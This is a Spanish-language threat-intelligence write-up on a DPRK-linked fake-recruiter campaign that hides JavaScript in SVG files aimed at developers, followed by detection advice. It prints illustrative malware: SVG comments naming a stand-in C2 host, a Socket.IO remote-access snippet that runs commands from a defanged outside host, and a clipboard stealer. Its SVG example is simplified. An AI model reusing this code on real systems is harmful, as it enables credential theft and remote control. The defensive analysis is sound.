## Resumen Ejecutivo

Este es **el caso más reciente del proyecto** (descubierto hace ~1 semana).

Una campaña de **actores alineados con Corea del Norte (DPRK)** llamada **Contagious Interview (REF9403)** utiliza **steganografía en archivos SVG** para ocultar malware de 4 etapas dirigido específicamente a **desarrolladores de software**.

**Punto crítico**: En el momento de la divulgación, **NINGÚN motor antivirus** detectó los repositorios trojanzados. Es un gap estructural en cómo los AV analizan el contenido semántico de SVG.

**Métricas clave:**
- Severidad: CRITICAL
- Target: Developers (premium targets)
- Método: SVG steganography
- AV Detection: ZERO at disclosure
- Payload: 4-stage OTTERCOOKIE-aligned
- Descubrimiento: Julio 18, 2026 (1 semana atrás)

## 1. El ataque: oferta de trabajo falsa

El ataque comienza de manera simple pero efectiva:

### Social Engineering Vector

Actores DPRK se hacen pasar por recruiters y publican en redes profesionales:

```
[SEÑUELO] OFERTA DE TRABAJO FALSA:
═══════════════════════════════════════════
Empresa: "TechCorp Innovations"
Posición: Senior Full-Stack Developer
Ubicación: Remote
Salario: $120k-140k

"Interesado? Completa nuestro coding challenge:
https://github.com/techcorp-innovations/developer-challenge"

(Link apunta a repo trojanzado)
═══════════════════════════════════════════
```

### ¿Por Qué Funciona?

1. **Developers son curiosos** → Validan sus skills con coding challenges
2. **GitHub es de confianza** → Menos escrutinio de seguridad
3. **Código real en el repo** → Parece legítimo
4. **SVG files = "no malware"** → AV tools no checksean content semántico

---

## 2. El contenedor: esteganografía en SVG

### ¿Cómo Funciona?

Los actores ocultan **malware JavaScript fragmentado** en **archivos SVG de banderas de países**.

```svg
<!-- Archivo: src/assets/flags/us-flag.svg (aparentemente inocuo) -->
<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
  <!-- US Flag stripes -->
  <rect x="0" y="0" width="100" height="100" fill="#B22234" />
  <rect x="0" y="8" width="100" height="8" fill="white" />
  
  <!-- AQUI ESTA EL MALWARE -->
  <!-- Stage 1: var _0x4f2c=['https://c2.example.com','exfil_data']; -->
  <!-- Stage 2: function steal_credentials() { ... } -->
  <!-- Stage 3: fetch('/api/service/makelog', {method:'POST'...}) -->
  <!-- Stage 4: setInterval(() => exfiltrate(), 60000) -->
</svg>
```

### Por Qué Esto Evade AV

**Antivirus tools están diseñados para:**
- <Pass />Detectar malware en ejecutables
- <Pass />Detectar scripts en archivos .js/.ps1
- <Pass />Detectar pixel-level image manipulation

**AV tools NO están diseñados para:**
- <Fail />Parsear comentarios HTML dentro de SVG tags
- <Fail />Entender que `<!-- código -->` es código
- <Fail />Analizar contenido semántico de XML/SVG

**Resultado**: Steganografía perfecta. Zero detections.

## 3. El payload: OTTERCOOKIE en 4 etapas

Cuando el developer corre el proyecto (`npm install` → `npm run build`):

### Stage 1: Browser Credential Stealer

```javascript
// Extracted from malware analysis
function steal_browser_credentials() {
  // Accede a:
  // - Chrome/Firefox stored passwords
  // - Saved credit cards
  // - OAuth tokens
  // - Session cookies
  
  exfiltrate_to_c2(credentials);
}
```

**Target**: 
- GitHub tokens
- AWS credentials
- Crypto wallet extensions (MetaMask, etc)

### Stage 2: Crypto Wallet Stealer

Specific focus on developer machines which often have:
- Hard-earned crypto holdings
- Private keys stored locally
- Seed phrases in memory

### Stage 3: Socket.IO RAT (Remote Access Trojan)

```javascript
const io = require('socket.io-client');
const socket = io('hxxps://rightwidth[.]dev:443');

socket.on('execute_command', (cmd) => {
  // Execute arbitrary shell commands
  exec(cmd, (err, stdout) => {
    socket.emit('command_result', stdout);
  });
});
```

**Permite a atacantes:**
- Ejecutar comandos arbitrary
- Instalar backdoors adicionales
- Lateral movement a la red
- Cambiar criptomonedas en exchanges

### Stage 4: Clipboard Stealer

```javascript
// Monitorea el clipboard constantemente
setInterval(() => {
  const clipboard_content = get_clipboard();
  
  if (clipboard_content.includes('0x') || // Crypto address
      clipboard_content.includes('http') || // URLs
      clipboard_content.match(/key|secret|password/i)) { // Credentials
    
    exfiltrate_to_c2(clipboard_content);
  }
}, 5000); // Every 5 seconds
```

**Purpose**: Capturar credenciales, direcciones de crypto, tokens cuando el user los copia/pega.

## Lecciones aprendidas

### Para Desarrolladores (TU AUDIENCIA)

1. **No ejecutes código de fuentes desconocidas**
   - Aunque GitHub sea de confianza, verifica repos antes de clonar
   - Leer el código antes de `npm install`

2. **Steganografía en imagenes es un vector subdetectado**
   - No asumir que archivos "inofensivos" (.svg, .png) son seguros
   - Monitorear procesos que accedan archivos multimedia

3. **Crypto wallets en dev machines es un riesgo**
   - Hardware wallets para holdings importantes
   - Separate machines para dev y cripto

4. **Code review es crítico en supply chain**
   - Especialmente para dependencias descargadas
   - CI/CD security scanning es essential

### Para SOC Analysts

1. **Expand detection beyond traditional file types**
   - Build YARA rules para SVG comment content
   - Monitor for Base64 decoding patterns
   - Hunt for Socket.IO imports (RAT indicator)

2. **Developer targeting requires specific defense**
   - Monitor browser credential access events
   - Alert on crypto wallet extension activities
   - Track `npm install` from unusual sources

3. **Zero antivirus detection ≠ zero threat**
   - File integrity monitoring critical
   - Behavioral analysis important
   - Endpoint Detection and Response (EDR) >> traditional AV

### Recomendaciones

<Pass />**Implementar:**
1. Software supply chain verification (code signing, package integrity)
2. Developer security training (social engineering awareness)
3. Repository scanning para embedded payloads en SVG/media files
4. Behavioral analysis para process execution during boot
5. Threat hunting para SVG comment blocks conteniendo código
6. Hardware wallet requirement para crypto holdings
7. Browser extension audits and allowlisting
8. Incident response plan para compromised development machines

<Pass />**Monitorear:**
1. SVG/image file access by JavaScript processes
2. Socket.IO library imports from unusual sources
3. Obfuscated code patterns in project dependencies
4. Clipboard access events
5. C2 infrastructure related to DPRK campaigns
